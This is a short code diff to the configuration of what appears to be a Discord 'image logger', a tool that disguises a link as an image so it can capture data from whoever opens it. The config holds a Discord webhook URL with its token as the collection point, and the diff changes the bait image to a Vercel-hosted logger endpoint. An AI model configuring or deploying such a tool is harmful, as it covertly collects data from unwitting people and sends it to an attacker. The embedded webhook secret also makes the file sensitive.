@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1399181293572325406/LwUVgzVXRPz84UoDE8xzt9XBXJJ77tHTs_bzrqDBGFquFRngiAXlRHQoji3cFtjpe966",
-    "image": "https://cdn.discordapp.com/attachments/1399179741759803444/1399182141178515487/Untitled.png?ex=6888116a&is=6886bfea&hm=fc9aa04d3913593435b50a9a70ae0ae29dbdd029e7d16f1eae5023e5763a49ca&", # You can also have a custom image by using a URL argument
+    "image": "https://discord-image-logger-lake.vercel.app/api/main.py", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
